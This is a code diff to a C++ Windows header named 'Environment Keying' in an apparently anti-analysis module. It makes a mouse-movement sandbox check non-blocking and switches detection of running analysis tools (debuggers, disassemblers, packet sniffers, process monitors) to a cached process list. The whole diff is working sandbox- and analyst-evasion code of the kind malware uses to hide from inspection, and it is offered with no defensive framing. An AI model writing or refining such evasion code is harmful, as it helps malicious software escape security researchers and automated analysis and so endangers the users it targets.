@@ -11,6 +11,8 @@
 
 #pragma comment(lib, "Psapi.lib")
 
+#include "domain/common/PerformanceOptimizer.hpp"
+
 namespace nuub::domain::anti {
 
 // ── Environment Keying ─────────────────────────────────────────
@@ -91,15 +93,28 @@ public:
         return !found_recent;
     }
 
-    // Check for mouse movement (sandboxes typically have no mouse activity)
-    static bool check_mouse_activity() {
-        POINT pos1, pos2;
-        GetCursorPos(&pos1);
-        Sleep(2000); // Wait 2 seconds
-        GetCursorPos(&pos2);
+    // Check for mouse movement (non-blocking, compares against last known position)
+    // Call check_mouse_initial() first to capture baseline, then check_mouse_activity()
+    static POINT last_mouse_pos_;
+    static bool mouse_baseline_set_;
 
-        // If mouse hasn't moved at all, likely a sandbox
-        return (pos1.x == pos2.x && pos1.y == pos2.y);
+    static bool check_mouse_initial() {
+        GetCursorPos(&last_mouse_pos_);
+        mouse_baseline_set_ = true;
+        return true;
+    }
+
+    static bool check_mouse_activity() {
+        if (!mouse_baseline_set_) {
+            return check_mouse_initial();
+        }
+        POINT current;
+        GetCursorPos(&current);
+        // If mouse hasn't moved since baseline, likely a sandbox
+        bool frozen = (last_mouse_pos_.x == current.x && last_mouse_pos_.y == current.y);
+        // Update baseline for next check
+        last_mouse_pos_ = current;
+        return frozen;
     }
 
     // Check number of installed programs
@@ -173,60 +188,19 @@ public:
         return false;
     }
 
-    // Check for sandbox-specific processes
+    // Check for sandbox-specific processes (uses cached process list)
     static bool check_sandbox_processes() {
-        DWORD processes[1024]{};
-        DWORD cb_needed = 0;
-        if (!EnumProcesses(processes, sizeof(processes), &cb_needed)) return false;
-
-        DWORD num_processes = cb_needed / sizeof(DWORD);
-        const char* sandbox_procs[] = {
-            // Cuckoo
-            "python.exe", // Cuckoo agent
-            "pyw.exe",
-            // Generic analysis
-            "procmon.exe", "procmon64.exe",
-            "processhacker.exe",
-            "wireshark.exe", "dumpcap.exe",
-            "fiddler.exe",
-            "apimonitor.exe",
-            "regshot.exe",
-            "x96dbg.exe", "x32dbg.exe",
-            "ollydbg.exe",
-            "ida.exe", "ida64.exe",
-            "ghidra.exe",
-            "cheatengine.exe",
-            "autoruns.exe",
-            "tcpview.exe",
-            "procexp.exe", "procexp64.exe",
-            "dbgview.exe",
-            nullptr
+        static const std::vector<std::string> sandbox_procs = {
+            "python.exe", "pyw.exe",
+            "procmon.exe", "procmon64.exe", "processhacker.exe",
+            "wireshark.exe", "dumpcap.exe", "fiddler.exe",
+            "apimonitor.exe", "regshot.exe",
+            "x96dbg.exe", "x32dbg.exe", "ollydbg.exe",
+            "ida.exe", "ida64.exe", "ghidra.exe",
+            "cheatengine.exe", "autoruns.exe", "tcpview.exe",
+            "procexp.exe", "procexp64.exe", "dbgview.exe"
         };
-
-        bool found = false;
-        for (DWORD i = 0; i < num_processes && !found; ++i) {
-            if (processes[i] == 0) continue;
-
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processes[i]);
-            if (!hProcess) continue;
-
-            char exe_path[MAX_PATH]{};
-            DWORD size = MAX_PATH;
-            if (QueryFullProcessImageNameA(hProcess, 0, exe_path, &size)) {
-                const char* filename = strrchr(exe_path, '\\');
-                if (filename) {
-                    filename++;
-                    for (int j = 0; sandbox_procs[j] != nullptr; ++j) {
-                        if (_stricmp(filename, sandbox_procs[j]) == 0) {
-                            found = true;
-                            break;
-                        }
-                    }
-                }
-            }
-            CloseHandle(hProcess);
-        }
-        return found;
+        return perf::ProcessCache::instance().any_running(sandbox_procs);
     }
 
     // Check for common VM/sandbox DLLs
@@ -483,4 +457,10 @@ public:
 };
 
 } // namespace nuub::domain::anti
+
+// Static member definitions
+namespace nuub::domain::anti {
+    POINT EnvironmentKeying::last_mouse_pos_ = {0, 0};
+    bool EnvironmentKeying::mouse_baseline_set_ = false;
+}
 #endif
